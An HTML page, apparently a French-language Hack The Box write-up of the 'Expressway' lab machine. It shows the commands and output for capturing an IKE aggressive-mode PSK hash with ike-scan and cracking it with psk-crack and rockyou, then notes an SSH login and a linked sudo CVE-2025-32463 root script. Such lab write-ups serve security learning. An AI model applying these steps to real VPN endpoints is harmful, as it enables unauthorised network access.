@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="fr" class="dark">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>Expressway - Writeup HTB</title>
+    <meta name="description" content="Writeup Hack The Box - Expressway">
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Zalando+Sans:ital,wght@0,200..900;1,200..900&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Zalando+Sans+Expanded:ital,wght@0,200..900;1,200..900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="../../styles.css">
+    <link rel="stylesheet" href="../writeups.css">
+    <link rel="icon" type="image/jpeg" href="../../assets/favi.png">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" defer></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-bash.min.js" defer></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js" defer></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-sql.min.js" defer></script>
+</head>
+
+<body class="writeups-mode">
+    <nav class="navbar">
+        <div class="container">
+            <div class="nav-content">
+                <a href="../../" class="nav-logo-link">
+                    <img src="../../assets/c8e38298-4426-4ed7-ab6b-1c8c5c263f64 (1).png" class="nav-logo"
+                        alt="logo signature Raphaël">
+                </a>
+                <div class="nav-links">
+                    <a href="../../" class="nav-link">Accueil</a>
+                    <a href="../" class="nav-link active">Writeups</a>
+                    <a href="../../Portfolio/" class="nav-link">Galerie</a>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <main class="min-h-screen">
+        <div class="writeups-container">
+            <a href="../" class="back-link">← Retour aux writeups</a>
+            <div class="writeup-content">
+<header><h1 class="page-title" dir="auto"><strong>Expressway</strong></h1></header><div class="page-body"><div style="display:contents" dir="auto"><h1 id="29caa764-c45c-80d5-af45-ce2ee58e998c" class="">USER</h1></div><div style="display:contents" dir="auto"><p id="29baa764-c45c-802f-93f3-cedff93c6a41" class="">Scan nmap initial, </p></div><div style="display:contents" dir="auto"><p id="29baa764-c45c-8011-8c3f-cc2f7dba0aa5" class="">ça n'envoie rien à part le port ssh </p></div><div style="display:contents" dir="auto"><p id="29baa764-c45c-80e7-917d-c9342436faaa" class="">Scan nmap de donc les ports udp </p></div><div style="display:contents" dir="auto"><pre id="29baa764-c45c-8077-be9b-c641e06be5ab" class="code code-wrap"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">paph@pc-paph:~$ sudo nmap -sU --top-ports 20 10.10.11.87</code></pre></div><div style="display:contents" dir="auto"><ul id="29baa764-c45c-80c4-8e05-e051ed55e995" class="bulleted-list"><li style="list-style-type:disc"><strong>Port 500 (ISAKMP)</strong> : OUVERT - utilisé pour IKE</li></ul></div><div style="display:contents" dir="auto"><p id="29caa764-c45c-8072-9643-f473c7f9f1ce" class="">je ne sais rien sur ceci donc petite phase apprentissage</p></div><div style="display:contents" dir="auto"><p id="29caa764-c45c-8037-bf2e-ec03351f3256" class=""><a href="https://www.verylazytech.com/network-pentesting/ipsec-ike-vpn-port-500-udp">https://www.verylazytech.com/network-pentesting/ipsec-ike-vpn-port-500-udp</a></p></div><div style="display:contents" dir="auto"><p id="29caa764-c45c-809a-856b-fd3802093555" class=""><a href="https://angelica.gitbook.io/hacktricks/network-services-pentesting/ipsec-ike-vpn-pentesting">https://angelica.gitbook.io/hacktricks/network-services-pentesting/ipsec-ike-vpn-pentesting</a></p></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"><p id="29baa764-c45c-8077-8f05-c75df15c67fd" class="">j’installe donc <code>ike-scan</code> et je fais un <strong>Scan IKE en mode Main</strong></p></div><div style="display:contents" dir="auto"><pre id="29baa764-c45c-8012-8459-e5539f3cae95" class="code code-wrap"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">paph@pc-paph:~$ sudo ike-scan -M 10.10.11.87
+Starting ike-scan 1.9.5 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
+10.10.11.87	Main Mode Handshake returned
+	HDR=(CKY-R=1ea51f060b07b890)
+	SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
+	VID=09002689dfd6b712 (XAUTH)
+	VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
+
+Ending ike-scan 1.9.5: 1 hosts scanned in 0.041 seconds (24.57 hosts/sec).  1 returned handshake; 0 returned notify</code></pre></div><div style="display:contents" dir="auto"><p id="29baa764-c45c-8058-8f4a-f17ab46883c0" class="">le mode d’authentification est preshared key donc Il y a une clé a craquer quelque part</p></div><div style="display:contents" dir="auto"><pre id="29baa764-c45c-80e5-b05c-c9cb8e0b0174" class="code code-wrap"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">paph@pc-paph:~$ sudo ike-scan -A -M --id=test 10.10.11.87
+Starting ike-scan 1.9.5 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
+10.10.11.87	Aggressive Mode Handshake returned
+	HDR=(CKY-R=8227ebf9c30719fb)
+	SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
+	KeyExchange(128 bytes)
+	Nonce(32 bytes)
+	ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
+	VID=09002689dfd6b712 (XAUTH)
+	VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
+	Hash(20 bytes)
+
+Ending ike-scan 1.9.5: 1 hosts scanned in 0.042 seconds (23.56 hosts/sec).  1 returned handshake; 0 returned notify</code></pre></div><div style="display:contents" dir="auto"><p id="29baa764-c45c-80b7-9c2e-c07aa80cfff7" class="">la j’ai un truc important <code>ike@expressway.htb</code></p></div><div style="display:contents" dir="auto"><p id="29baa764-c45c-8001-aaae-cab6b1b69c10" class="">je relance en mode agressif</p></div><div style="display:contents" dir="auto"><p id="29caa764-c45c-80b7-bc1d-c9b728ad1d28" class="">En mode aggressif, le serveur envoie son identité ET un hash dérivé du PSK <strong>AVANT</strong> que le tunnel soit chiffré</p></div><div style="display:contents" dir="auto"><pre id="29baa764-c45c-804d-b34a-c098dea40b5f" class="code code-wrap"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">paph@pc-paph:~$ sudo ike-scan -A -M 10.10.11.87 -P
+Starting ike-scan 1.9.5 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
+10.10.11.87	Aggressive Mode Handshake returned
+	HDR=(CKY-R=3d5e06d1de94fee3)
+	SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
+	KeyExchange(128 bytes)
+	Nonce(32 bytes)
+	ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
+	VID=09002689dfd6b712 (XAUTH)
+	VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
+	Hash(20 bytes)
+
+IKE PSK parameters (g_xr:g_xi:cky_r:cky_i:sai_b:idir_b:ni_b:nr_b:hash_r):
+9243c2a98573389a06ae62526e8632d3cc506bae38ee53435444bd8c6f9ebd8b15ca2fe4457236f3b6042c4f1565e424ac877e4ebcf32cd76a32c24305e687bba6d112d4e8dc7d64e8ce0a349280b970586e05283f0e4005e3951ece6241e8ae75ccd0fda69f25ab8b6330dbebb92bc437adfe8fd8bbe5303dccf7fd8c575d28:bd4fc3c1a191b44972c0f55a605f78b888f7f2c7905a3941ccaa0774bb7083faa7a4a0f82220c3d48af694bc40e9bc8dec951895910701dff4646b37af07f3e47a97e2f8faaac223a0d02f5792799180318bae9621c7b7b2ead4e87487d645a575dd02888ece43d376a689c3ab8bebbb472689139c3809ea47f5348d511feed4:3d5e06d1de94fee3:35e822119212eb52:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e687462:5ffe79fbdb2f6ee7a2db8fca39a50f966ea04fa3:502a97a6a346f102a791dc4c72678f9123bf03b759ce6237b552a63570c2fd39:1dbe9627b7591489148916cc1ecd83fe6e6b24a0</code></pre></div><div style="display:contents" dir="auto"><p id="29baa764-c45c-8034-957e-f458369ce9af" class=""><code>ike-scan</code> a un tool de crack de mdp intégré donc je le test avec rockyou</p></div><div style="display:contents" dir="auto"><pre id="29baa764-c45c-80d2-860a-dd3f05f9ad7c" class="code code-wrap"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">paph@pc-paph:~$ sudo !!
+sudo psk-crack -d /usr/share/wordlists/rockyou.txt psk_hash.txt
+Starting psk-crack [ike-scan 1.9.5] (http://www.nta-monitor.com/tools/ike-scan/)
+Running in dictionary cracking mode
+key &quot;freakingrockstarontheroad&quot; matches SHA1 hash 1dbe9627b7591489148916cc1ecd83fe6e6b24a0
+Ending psk-crack: 8045040 iterations in 4.509 seconds (1784256.61 iterations/sec)</code></pre></div><div style="display:contents" dir="auto"><p id="29baa764-c45c-804c-811b-ef4b31e541f9" class=""><code>freakingrockstarontheroad</code></p></div><div style="display:contents" dir="auto"><p id="29caa764-c45c-808c-833c-c80b7c0f3e41" class="">Connexion SSH avec ces creds en esperant que c’est les memes que plus haut et ça fonctionne j’ai le flag user</p></div><div style="display:contents" dir="auto"><h1 id="29caa764-c45c-8002-978b-e8f277acff46" class="">ROOT</h1></div><div style="display:contents" dir="auto"><p id="29caa764-c45c-8043-953b-cf7a9a27ad1f" class="">Exécution de LinPEAS </p></div><div style="display:contents" dir="auto"><p id="29caa764-c45c-8009-9760-e4723844aa95" class="">On observe que <code>Sudo version 1.9.17</code><br/>je cherche et je vois qu’Il y a une cve : CVE-2025-32463</p></div><div style="display:contents" dir="auto"><p id="29caa764-c45c-8076-8588-cce4d302026d" class="">je trouve un<a href="https://github.com/mirchr/CVE-2025-32463-sudo-chwoot/blob/main/sudo-chwoot.sh"> script </a></p></div><div style="display:contents" dir="auto"><p id="29caa764-c45c-80c4-b52e-fec982c3e8ac" class="">je l’execute et je suis root je cat le flag</p></div><div style="display:contents" dir="auto"></div></div>
+            </div>
+        </div>
+    </main>
+</body>
+
+</html>
